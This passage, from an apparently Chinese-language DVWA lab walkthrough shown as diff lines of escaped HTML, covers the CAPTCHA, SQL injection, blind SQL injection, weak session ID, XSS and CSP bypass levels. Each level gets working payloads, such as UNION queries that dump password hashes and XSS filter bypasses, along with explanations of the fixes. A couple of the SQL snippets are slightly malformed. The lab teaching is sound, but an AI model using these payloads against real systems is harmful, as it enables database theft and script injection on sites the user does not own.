+&lt;p&gt;我并没看懂这一关的逻辑，毕竟 reCAPTCHA 验证代码放在独立的模块里。可能意思是开发者留的后门？&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl &apos;http://localhost/vulnerabilities/captcha/&apos; \
+  -H &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&apos; \
+  -H &apos;Content-Type: application/x-www-form-urlencoded&apos; \
+  -H &apos;Cookie: _pk_id.1.1fff=83ca368cc934da2a.1713256286.; pma_lang=zh_CN; phpMyAdmin=211204361d2d8ca74ddb7cf6114904ad; pmaUser-1=yfZDMnTAKyPV7j%2B7cQQNL%2FzQSTP4EIu%2BlPfwwl8x8qc8at35nhtpEyye8Rc%3D; security=high; PHPSESSID=c830c512bdc160d1bd45b89fd12a8f27&apos; \
+  -H &amp;quot;User-Agent: reCAPTCHA&amp;quot; \
+  --data-raw &apos;step=1&amp;amp;password_new=123456&amp;amp;password_conf=123456&amp;amp;g-recaptcha-response=hidd3n_valu3&amp;amp;user_token=0b419bbb618c37f400efc2b2d03337a9&amp;amp;Change=Change&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Impossible：正常地使用&lt;/h3&gt;
+&lt;p&gt;相比前几个等级，这个等级：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;添加表单需要用户输入当前密码，密码正确才能修改密码。&lt;/li&gt;
+&lt;li&gt;正常地验证 reCAPTCHA，没有 high 中奇怪的判定。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;说实话，这才是正常人能想到的 reCAPTCHA 使用方式。这关从 low 到 high 感觉都不是正常人能写出来的代码……&lt;/p&gt;
+&lt;h2&gt;SQL Injection&lt;/h2&gt;
+&lt;p&gt;SQL 注入是老生常谈的安全漏洞。本题提供了一个表单，输入 user id 并提交，能够查询指定 id 的用户，并显示列表。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;任意操纵数据库。&lt;/p&gt;
+&lt;h3&gt;Low：无防护&lt;/h3&gt;
+&lt;p&gt;没有任何 SQL 注入的检测。查询 &lt;code&gt;1&apos; OR 1=1; #&lt;/code&gt;，可以得到所有记录。说明这关的注入是&lt;strong&gt;字符型&lt;/strong&gt;，即输入的内容作为字符串类型。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;确定该表包含字段数量。&lt;/strong&gt;提交 &lt;code&gt;&apos; OR 1=1 ORDER BY 2; #&lt;/code&gt; 正常返回，&lt;code&gt;&apos; OR 1=1 ORDER BY 3; #&lt;/code&gt; 则报错，说明该表共两个字段。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;确定服务器包含的数据库。&lt;/strong&gt;提交 &lt;code&gt;&apos; AND 0=1 UNION SELECT 1,database(); #&lt;/code&gt;，能看到只有 &lt;code&gt;dvwa&lt;/code&gt; 这一个数据库。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;确定数据库包含的所有表。&lt;/strong&gt;提交 &lt;code&gt;&apos; AND 0=1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;dvwa&apos;; #&lt;/code&gt; 可以看到所有表的名称，有 users 和 guestbook。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;确定表包含的字段。&lt;/strong&gt;提交 &lt;code&gt;&apos; AND 0=1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos;; #&lt;/code&gt; 可以拿到 uses 表包含的所有字段。&lt;/p&gt;
+&lt;p&gt;最后就可以想查什么就查什么了。比如用户名和密码的 MD5：&lt;code&gt;&apos; AND 0=1 UNION SELECT user,password FROM users; #&lt;/code&gt;。&lt;/p&gt;
+&lt;h3&gt;Medium：字符转义&lt;/h3&gt;
+&lt;p&gt;相比 low 等级：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;将输入框改为了选择菜单，请求方式改为 POST。但是 POST 接收的参数依然被当作字符串处理。&lt;/li&gt;
+&lt;li&gt;对 id 中的字符进行了转义，使用的是 &lt;code&gt;mysqli_real_escape_string&lt;/code&gt; 函数，这个函数会转义 NUL（ASCII 0）、&lt;code&gt;\n&lt;/code&gt;、&lt;code&gt;\r&lt;/code&gt;、&lt;code&gt;\&lt;/code&gt;、&lt;code&gt;&apos;&lt;/code&gt;、&lt;code&gt;&amp;quot;&lt;/code&gt; 和 Control-Z 这些字符。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;尝试 &lt;code&gt;1 OR 1=1;#&lt;/code&gt; 可以判断这题的注入是&lt;strong&gt;数字型&lt;/strong&gt;，即输入内容作为数字类型。那么，不需要用到引号等被过滤的符号。&lt;/p&gt;
+&lt;p&gt;直接用和上题一样的方法就好。&lt;/p&gt;
+&lt;h3&gt;High：单独的页面&lt;/h3&gt;
+&lt;p&gt;这个等级打开一个单独的页面里发送请求，而响应存在后端 SESSION 里，在原来的页面中才显示。这样用 sqlmap 之类的工具进行注入就会比较麻烦，只能自己写脚本或者手工注入。&lt;/p&gt;
+&lt;p&gt;不过，除此之外，其他防护措施和 low 等级一样。&lt;/p&gt;
+&lt;h3&gt;Impossible：限制数据类型 &amp;amp; 预编译&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;判断 id 是否为数字。&lt;/li&gt;
+&lt;li&gt;使用了预编译处理 SQL 语句。这就是「代码与数据分离」。&lt;/li&gt;
+&lt;li&gt;CSRF 防护。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;SQL Injection (Blind)&lt;/h2&gt;
+&lt;p&gt;SQL 盲注，指的是虽然页面存在 SQL 注入的漏洞，但是我们无法直接看到查询的结果，只能看到成功与否之类非常有限的信息。这大大增加了注入难度。&lt;/p&gt;
+&lt;p&gt;这一关就是如此：输入用户 ID，只返回用户 ID 是否存在。这相当于每次只给我们 true 或 false 的信息。&lt;/p&gt;
+&lt;p&gt;这一关不同难度增加的限制，和上一关完全一致，只有返回显示结果的区别。所以此处只介绍针对 low 的通用方法。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;猜测是字符型还是整数型。&lt;/strong&gt;尝试 &lt;code&gt;1 AND 1=2; #&lt;/code&gt; 发现能找到记录，&lt;code&gt;1&apos; AND 1=2; #&lt;/code&gt; 则不行，则证明是字符型。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;猜数据库名长度。&lt;/strong&gt;查询 &lt;code&gt;&apos; OR length(database())=4; #&lt;/code&gt; 为真，其他长度都为假，说明当前数据库名长度为 4。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;猜数据库名。&lt;/strong&gt;用诸如 &lt;code&gt;&apos; OR ascii(substr(database(),1,1)&amp;gt;97; #&lt;/code&gt; 这样的查询，可以一个一个字符猜出数据库名（可以用二分）。其他的猜测和以上注入同理。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;如果程序不返回任何内容，连成功与否都不知道，怎么办呢？&lt;/strong&gt;可以利用&lt;strong&gt;延时&lt;/strong&gt;。例如：&lt;code&gt;&apos; AND sleep 5&lt;/code&gt;。SQL 中的 AND 有和大多数编程语言一样的短路运算，当 AND 左侧为 false 则不计算右侧。如果能找到记录，会等待五秒才返回；如果找不到记录，则会立即返回。通过这种方式我们相当于也获得了 true 或 false 的反馈信息。&lt;/p&gt;
+&lt;h2&gt;Weak Session IDs&lt;/h2&gt;
+&lt;p&gt;这个场景只提供一个按钮，每次点击就能生成或更新本地名为 dvwaSession 的 Cookie。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标：&lt;/strong&gt;猜测下一次生成的 dvwaSession，或者猜测其他用户生成的 dvwaSession。Session 一般作为用户身份的凭证，如果能够猜到其生成方式，往往能够伪造他人身份。&lt;/p&gt;
+&lt;h3&gt;Low：简单计数器&lt;/h3&gt;
+&lt;p&gt;非常简单直白的方式生成 dvwaSession：第一次生成 1，之后每次重新生成就加 1。这种方式太容易伪造了。&lt;/p&gt;
+&lt;h3&gt;Medium：时间戳&lt;/h3&gt;
+&lt;p&gt;将时间戳作为 dvwaSession。时间戳没有随机性并且可预知，攻击者也完全可以伪造。&lt;/p&gt;
+&lt;h3&gt;High：计数器 MD5 &amp;amp; 访问限制&lt;/h3&gt;
+&lt;p&gt;这一等级仍然使用计数器作为 dvwaSession，不同之处在于存入 Cookie 时用 MD5 哈希了一下。计数器每次加 1，所以不会很大，可以轻易枚举出哈希前的计数器。&lt;/p&gt;
+&lt;p&gt;这一等级还设定了 Cookie 的失效时间为一小时，指定只能在 &lt;code&gt;/vulnerabilities/weak_id/&lt;/code&gt; 路径以及当前域名下使用，&lt;/p&gt;
+&lt;p&gt;Cookie 的 secure、httpOnly 选项都设为 false，这意味着 Cookie 可以在非 HTTPS 连接下使用、可以被 JavaScript 脚本访问。这是不安全的设置。&lt;/p&gt;
+&lt;h3&gt;Impossible：随机化 &amp;amp; 强限制&lt;/h3&gt;
+&lt;p&gt;在 high 的基础上：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用时间戳、随机数，用 SHA1 算法生成 Cookie。这确保了充分的 Cookie 随机化。&lt;/li&gt;
+&lt;li&gt;secure、httpOnly 选项都设为 true。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;相比 high，这个等级：1）无法枚举预测 Cookie；2）有更严格的访问限制。&lt;/p&gt;
+&lt;h2&gt;DOM Based Cross Site Scripting (XSS)&lt;/h2&gt;
+&lt;p&gt;在做 XSS 的三个关卡之前，回顾之前 &lt;a href=&quot;https://skywt.cn/blog/xss-labs-tutorial/#总结&quot;&gt;xss-labs 的题解&lt;/a&gt;，执行 JavaScript 代码一般有四种方式：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签。&lt;/li&gt;
+&lt;li&gt;通过元素的 onmouseover 属性。&lt;/li&gt;
+&lt;li&gt;通过 &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; 的 onerror 属性，如 &lt;code&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;通过 URI，如 &lt;code&gt;javascript:alert(1)&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;这一关提供了一个包含下拉选择框的表单，提供了若干语言选项。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;实现 XSS 注入，执行我们想要的 JavaScript 脚本。&lt;/p&gt;
+&lt;h3&gt;Low：虚假的下拉框&lt;/h3&gt;
+&lt;p&gt;选择 &lt;code&gt;English&lt;/code&gt; 并 Submit，可以发现 &lt;code&gt;English&lt;/code&gt; 作为字符串传进了 URL，作为 &lt;code&gt;default&lt;/code&gt; 的值。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/xss_d/?default=English
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;将 URL 中 &lt;code&gt;English&lt;/code&gt; 改为 &lt;code&gt;test&lt;/code&gt;，会发现页面里下拉框中文本也变成了 &lt;code&gt;test&lt;/code&gt;。显然这个下拉框只是个幌子，&lt;code&gt;default&lt;/code&gt; 的值不仅限于这四种语言。&lt;/p&gt;
+&lt;p&gt;可以发现表单中有一段脚本用于处理 &lt;code&gt;default&lt;/code&gt; 的值，使用了非常愚蠢的 &lt;code&gt;document.write&lt;/code&gt;：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;if (document.location.href.indexOf(&amp;quot;default=&amp;quot;) &amp;gt;= 0) {
+  var lang = document.location.href.substring(document.location.href.indexOf(&amp;quot;default=&amp;quot;)+8);
+  document.write(&amp;quot;&amp;lt;option value=&apos;&amp;quot; + lang + &amp;quot;&apos;&amp;gt;&amp;quot; + decodeURI(lang) + &amp;quot;&amp;lt;/option&amp;gt;&amp;quot;);
+  document.write(&amp;quot;&amp;lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&amp;gt;----&amp;lt;/option&amp;gt;&amp;quot;);
+}
+document.write(&amp;quot;&amp;lt;option value=&apos;English&apos;&amp;gt;English&amp;lt;/option&amp;gt;&amp;quot;);
+document.write(&amp;quot;&amp;lt;option value=&apos;French&apos;&amp;gt;French&amp;lt;/option&amp;gt;&amp;quot;);
+document.write(&amp;quot;&amp;lt;option value=&apos;Spanish&apos;&amp;gt;Spanish&amp;lt;/option&amp;gt;&amp;quot;);
+document.write(&amp;quot;&amp;lt;option value=&apos;German&apos;&amp;gt;German&amp;lt;/option&amp;gt;&amp;quot;);               
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;那么，将 &lt;code&gt;default&lt;/code&gt; 的值改为 &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; 进行 encodeURI 之后的值，即可成功出现弹窗：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;%3Cscript%3Ealert(1)%3C/script%3E
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Medium：后端过滤 script 标签&lt;/h3&gt;
+&lt;p&gt;相比 low，在后端添加了检测，如果 URL 的 &lt;code&gt;default&lt;/code&gt; 值包含 &lt;code&gt;&amp;lt;script&lt;/code&gt; 字串，则强制设置为 &lt;code&gt;English&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;当然，引入 JavaScript 代码的方式并不止 script 标签一种。比如：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;button onclick=&apos;alert(1)&apos;&amp;gt;&amp;lt;/button&amp;gt;
+&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;div onmouseover=&apos;alert(1)&apos; style=&apos;height: 1000px; width: 1000px&apos;&amp;gt;&amp;lt;/div&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这段代码将 select 组件闭合，并插入一个其他元素，能够触发弹窗。button 需要点击触发，而插入一个很大的 div 则用户鼠标经过就触发。经过实测，因为这个 div 很大，还是非常容易触发的……&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;⚠️ 浏览器的安全限制：&lt;/strong&gt;由于 &lt;code&gt;document.write&lt;/code&gt; 存在较多安全问题，已经是强烈不建议使用的方法（参见 &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/Document/write&quot;&gt;MDN 文档&lt;/a&gt;），许多浏览器对其添加了诸多限制，例如 Chrome 浏览器的&lt;a href=&quot;https://developer.chrome.com/blog/removing-document-write/#catch_warnings_in_chrome_devtools&quot;&gt;这篇文档&lt;/a&gt;。所以，这一关很多更好的方法都无法使用，比如 &lt;code&gt;&amp;lt;img src=1 onerror=&apos;alert(1)&apos;&amp;gt;&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;（除了这种方法之外，使用下述 high 等级的方法也能通过这一关）&lt;/p&gt;
+&lt;h3&gt;High：后端白名单，但前端简单粗暴&lt;/h3&gt;
+&lt;p&gt;相比 medium，这关在后端直接使用了白名单：&lt;code&gt;default&lt;/code&gt; 参数对应的值只能是 &lt;code&gt;English&lt;/code&gt; 等四个值中的一种。其他情况，就重定向到 &lt;code&gt;default=English&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;不过，或许你已经注意到了，前端获取 &lt;code&gt;default&lt;/code&gt; 对应的值的这段代码，非常简单粗暴：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;if (document.location.href.indexOf(&amp;quot;default=&amp;quot;) &amp;gt;= 0) {
+  var lang = document.location.href.substring(document.location.href.indexOf(&amp;quot;default=&amp;quot;)+8);
+  // ...
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;直接搜索 URL 中 &lt;code&gt;default=&lt;/code&gt; 这个字串，不管三七二十一，将等号之后的内容都视为 lang 的值。然而，我们知道如果后面又有别的参数（例如 &lt;code&gt;default=English&amp;amp;param=test&lt;/code&gt;），这个参数也会被放进 lang 里，但会被后端忽略。&lt;/p&gt;
+&lt;p&gt;所以只要加个 &lt;code&gt;&amp;amp;&lt;/code&gt; 就能避免后端的检测了：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;English&amp;amp;%3Cscript%3Ealert(1)%3C/script%3E
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Impossible：前端不要 decode&lt;/h3&gt;
+&lt;p&gt;之前从 low 到 high 的前端代码都犯了非常蠢的错误：直接将拿到的 lang 进行 decode 并在前端展示出来（&lt;code&gt;decodeURI(lang)&lt;/code&gt;）。&lt;/p&gt;
+&lt;p&gt;事实上，对于 &lt;code&gt;English&lt;/code&gt; 等四个选项，其中并不包含任何特殊字符，完全不需要 decode。只要不 decode，攻击者就不可能注入任何特殊字符了。Impossible 就改写了这一点：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;if (document.location.href.indexOf(&amp;quot;default=&amp;quot;) &amp;gt;= 0) {
+  // ...
+  document.write(&amp;quot;&amp;lt;option value=&apos;&amp;quot; + lang + &amp;quot;&apos;&amp;gt;&amp;quot; + (lang) + &amp;quot;&amp;lt;/option&amp;gt;&amp;quot;);
+  // ...
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;不过，这个选项仍然不是最好的解决方案，因为使用了 &lt;code&gt;document.write&lt;/code&gt; 等非常不优雅的写法，并且用户仍然可能传入非预期的字符串（虽然不可能进行 XSS 攻击了）。如果让我来设计，或许我会将选项从 0 开始编号，URL 中只允许用户传入一个数字编号，在前端将其换成对应的选项。&lt;/p&gt;
+&lt;h2&gt;Reflected Cross Site Scripting (XSS)&lt;/h2&gt;
+&lt;p&gt;这一关提供一个表单，让我们输入名字。当点击提交后，名字会通过 &lt;code&gt;name&lt;/code&gt; 这个 param 传送给页面，表单下方会展示「Hello xxx」。&lt;/p&gt;
+&lt;h3&gt;Low：无防护&lt;/h3&gt;
+&lt;p&gt;没有任何防护。&lt;/p&gt;
+&lt;p&gt;输入 &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; 并提交，这段代码被原封不动地写入 HTML，就能成功弹窗。&lt;/p&gt;
+&lt;h3&gt;Medium：子串替换&lt;/h3&gt;
+&lt;p&gt;后端进行了防护：将输入包含的所有 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 子串替换为空串。&lt;/p&gt;
+&lt;p&gt;和 File Inclusion 里的 medium 解法相同，可以通过双写的方式规避：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;sc&amp;lt;script&amp;gt;ript&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;使用下文所述 high 的方法也能解决。&lt;/p&gt;
+&lt;h3&gt;High：正则表达式替换&lt;/h3&gt;
+&lt;p&gt;相比 medium，这次通过正则表达式替换了 &lt;code&gt;&amp;lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&lt;/code&gt;，使用双写的方法无效了。&lt;/p&gt;
+&lt;p&gt;同前所述，script 并非引入 JavaScript 的唯一方式。也可以使用：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Impossible：htmlspecialchars&lt;/h3&gt;
+&lt;p&gt;相比 high 等级，这个等级：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;增加了 CSRF 防护。&lt;/li&gt;
+&lt;li&gt;通过 &lt;code&gt;htmlspecialchars&lt;/code&gt; 转义输入字符串。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;一般来说，为了防范 XSS，使用 PHP 内置的 &lt;code&gt;htmlspecialchars&lt;/code&gt; 函数转义字符串，是最优解。&lt;/p&gt;
+&lt;h2&gt;Stored Cross Site Scripting (XSS)&lt;/h2&gt;
+&lt;p&gt;本题场景是一个类似留言板的功能，提供一个表单，可以填写姓名和文本，提交后填写的内容将被存储，在留言列表中展示出来。&lt;/p&gt;
+&lt;h3&gt;Low：无防护&lt;/h3&gt;
+&lt;p&gt;在 message 中填入 &lt;code&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; 提交，该内容会被原封不动地注入 HTML 导致弹窗。&lt;/p&gt;
+&lt;p&gt;这一关卡所有难度都使用了 &lt;code&gt;mysqli_real_escape_string&lt;/code&gt; 过滤了输入，从而防止 SQL 注入攻击。由于 SQL 注入不是本关卡的重点，与 XSS 无关，下面暂时不考虑。&lt;/p&gt;
+&lt;h3&gt;Medium：name 子串替换&lt;/h3&gt;
+&lt;p&gt;相比 low，这一关在后端对 name 和 message 分别进行了过滤：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对于 message：使用 PHP 的 &lt;code&gt;strip_tags&lt;/code&gt; 函数去除所有 HTML 和 PHP 标签，然后使用 &lt;code&gt;htmlspecialchars&lt;/code&gt; 函数转义存储。&lt;/li&gt;
+&lt;li&gt;对于 name：将所有 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签替换为空。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;很显然，对 name 的处理存在和上一关（反射型 XSS）一样的问题，可以双写 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 或者使用 img 标签。&lt;/p&gt;
+&lt;p&gt;对于 name 输入框的长度限制，直接在浏览器里修改该元素的 maxlength 属性即可。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+&amp;lt;img src=1 onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;High：name 正则表达式替换&lt;/h3&gt;
+&lt;p&gt;和反射型 XSS 里一样，将处理 name 字段时的 &lt;code&gt;str_replace&lt;/code&gt; 子串替换，换成了基于正则表达式的替换。双写不能用了，但是 img 还是可以用：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;img src=1 onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Impossible：htmlspecialchars&lt;/h3&gt;
+&lt;p&gt;相比 high 等级，这个等级：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;增加了 CSRF 防护。&lt;/li&gt;
+&lt;li&gt;通过 &lt;code&gt;htmlspecialchars&lt;/code&gt; 转义 name。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;存储型 XSS 这一关和反射型非常类似。最佳安全实践也一样：使用 &lt;code&gt;htmlspecialchars&lt;/code&gt;。&lt;/p&gt;
+&lt;h2&gt;Content Security Policy (CSP) Bypass&lt;/h2&gt;
+&lt;p&gt;浏览器的内容安全策略，是可以在 Content-Security-Policy 相应头中定义的一系列规则，告诉浏览器在访问内容时应该添加何种限制。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;通过 script 标签，引入外部脚本。&lt;/p&gt;
+&lt;h3&gt;Low：引用 script 的限制&lt;/h3&gt;
+&lt;p&gt;这一等级给出一个表单，提交的 URL 会被作为 script 的 src 引入。&lt;/p&gt;
+&lt;p&gt;这一等级的 Content-Security-Policy 请求头内容如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Content-Security-Policy: script-src &apos;self&apos; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja;
+// allows js from self, pastebin.com, hastebin.com, jquery, digi.ninja, and google analytics.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;页面给出了五个测试链接：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;alert.js&lt;/code&gt;：成功引用&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;alert.txt&lt;/code&gt;：无法引用&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cookie.js&lt;/code&gt;：成功引用&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;forced_download.js&lt;/code&gt;：无法引用&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wrong_content_type.js&lt;/code&gt;：无法引用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;网页引入的 script 脚本，要满足如下限制：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MIME 必须是 &lt;code&gt;text/javascript&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;相应头不能包含 &lt;code&gt;Content-Disposition: attachment&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Medium：不变的 nonce&lt;/h3&gt;
+&lt;p&gt;这一等级给出一个表单，提交的内容会被直接插入 HTML 中，且关闭了 XSS 防护。&lt;/p&gt;
+&lt;p&gt;该等级的 Content-Security-Policy 请求头：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Content-Security-Policy: script-src &apos;self&apos; &apos;unsafe-inline&apos; &apos;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&apos;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;请求头里包含了 nonce。nonce 后加一个 base64 编码后的字符串。添加这一限制后，所有 script 都必须带上相同的 nonce，否则浏览器就拒绝执行。&lt;/p&gt;
+&lt;p&gt;然而，这一等级中 nonce 并不是每次随机生成的，而是一个固定的字符串 &lt;code&gt;Tm...XA=&lt;/code&gt;。事实上，base64 解码之后内容是：「Never going to give you up」……&lt;/p&gt;
+&lt;p&gt;只要提交这样的一段 script 即可：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;script nonce=&amp;quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&amp;quot;&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;High：JSONP&lt;/h3&gt;
+&lt;p&gt;这一等级中，页面调用 &lt;code&gt;jsonp.php&lt;/code&gt; 执行代码。&lt;/p&gt;
+&lt;p&gt;JSONP（JSON with Padding）是一种跨域请求的技术，动态创建 script 标签，并将跨域请求到的资源当作 JavaScript 代码执行。&lt;/p&gt;
+&lt;p&gt;可以看到这个页面中 button 绑定的回调函数：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function clickButton() {
+    var s = document.createElement(&amp;quot;script&amp;quot;);
+    s.src = &amp;quot;source/jsonp.php?callback=solveSum&amp;quot;;
+    document.body.appendChild(s);
+}
+
+function solveSum(obj) {
+    if (&amp;quot;answer&amp;quot; in obj) {
+        document.getElementById(&amp;quot;answer&amp;quot;).innerHTML = obj[&apos;answer&apos;];
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;jsonp.php&lt;/code&gt; 脚本内容如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
+header(&amp;quot;Content-Type: application/json; charset=UTF-8&amp;quot;);
+
+if (array_key_exists (&amp;quot;callback&amp;quot;, $_GET)) {
+    $callback = $_GET[&apos;callback&apos;];
+} else {
+    return &amp;quot;&amp;quot;;
+}
+
+$outp = array (&amp;quot;answer&amp;quot; =&amp;gt; &amp;quot;15&amp;quot;);
+
+echo $callback . &amp;quot;(&amp;quot;.json_encode($outp).&amp;quot;)&amp;quot;;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当传入 callback 参数为 &lt;code&gt;solveSum&lt;/code&gt;，&lt;code&gt;jsonp.php&lt;/code&gt; 将构造一段 JavaScript 代码，这段代码用指定的参数调用 &lt;code&gt;solveSum&lt;/code&gt;。即：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;solveSum({answer: 15})
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其实目的是为了拿到其中的 JSON 数据，但是以调用函数的代码形式返回，外面这层函数就叫做 padding，故名曰 JSON with Padding。&lt;/p&gt;
+&lt;p&gt;然而，JSONP 将调用传入的 callback 参数，这个函数是前端传入的。我们只要重新定义 callback 参数的内容，就能让页面执行我们想要的 JavaScript 代码。比如：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function clickButton() {
+    var s = document.createElement(&amp;quot;script&amp;quot;);
+    s.src = &amp;quot;source/jsonp.php?callback=alert&amp;quot;;
+    document.body.appendChild(s);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Impossible：硬编码函数名&lt;/h3&gt;
+&lt;p&gt;这一等级仍然使用 JSONP，但是不读取 callback 的值，而是将 solveSum 这一函数名硬编码进 &lt;code&gt;jsonp.php&lt;/code&gt;。这才是使用 JSONP 的正确方式。&lt;/p&gt;
+&lt;h2&gt;JavaScript Attacks&lt;/h2&gt;
+&lt;p&gt;这一关提供了一个表单，我们可以提交一个 phase，同时前端计算了 &lt;code&gt;ChangeMe&lt;/code&gt; 这个 phase 的哈希，后端验证哈希是否匹配。&lt;/p&gt;
